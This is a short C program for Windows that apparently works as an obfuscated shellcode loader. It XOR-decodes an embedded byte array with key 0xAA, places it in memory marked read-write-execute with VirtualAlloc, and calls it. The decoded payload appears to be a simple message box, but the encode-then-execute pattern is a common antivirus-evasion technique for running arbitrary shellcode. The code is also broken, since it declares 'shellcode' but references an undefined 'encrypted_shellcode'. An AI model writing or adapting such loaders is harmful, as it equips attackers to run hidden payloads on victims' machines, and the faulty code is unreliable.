#include <stdio.h>
#include <windows.h>

#define XOR_KEY 0xAA

void xor_decp(unsigned char * data, size_t len) {
	for (size_t i = 0; i < len; i++) {
		data[i] ^= XOR_KEY;
	}
}

int main() {
	unsigned char shellcode[] = "\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x7a\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xfb\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\x94\xe2\x21\xf8\xb2\x94\xe2\x21\xf8\x8a\x94\xe2\x21\xd8\xfa\x94\xe2\xa5\x1d\xe0\xe0\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\x94\xe2\x21\xf8\x8a\x94\x21\xe8\x96\xe2\xab\x7a\x94\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xc5\xe2\xab\x7a\xfa\x94\x21\xe2\xb2\x94\xee\x21\xea\x8a\xe3\xab\x7a\x49\xf6\xe2\x55\x63\x94\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\x94\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x7c\xf2\x94\xee\x21\xea\x8e\xe3\xab\x7a\xcc\x94\xeb\x21\xa6\xe2\x94\xee\x21\xea\xb6\xe3\xab\x7a\x94\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\x94\xe2\x21\xb8\x43\xe3\x55\x55\x55\xf7\x94\xe2\x27\x27\x8b\xab\xaa\xaa\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe3\x6d\x6b\xaa\xaa\xaa\xaa\x94\xe2\x27\x3f\xa4\xab\xaa\xaa\x94\xe6\x27\x2f\xb1\xab\xaa\xaa\xe2\x9b\x63\xeb\x10\xef\x29\xfc\xad\x55\x7f\xe2\x9b\x63\xeb\x10\x5a\x1f\x08\xfc\x55\x7f\xe2\xcf\xc6\xc6\xc5\x86\x8a\xdd\xc5\xd8\xc6\xce\xaa\xe2\xcf\xc6\xc6\xc5\xaa\xdf\xd9\xcf\xd8\x99\x98\x84\xce\xc6\xc6\xaa\xaa";
	
	size_t buf_len = sizeof(encrypted_shellcode) - 1;

	xor_decp(encrypted_shellcode, buf_len);

	void *exec = VirtualAlloc(0, sizeof(encrypted_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	RtlMoveMemory(exec, encrypted_shellcode, sizeof(encrypted_shellcode));

	((void(*)())exec)();

	return 0;
}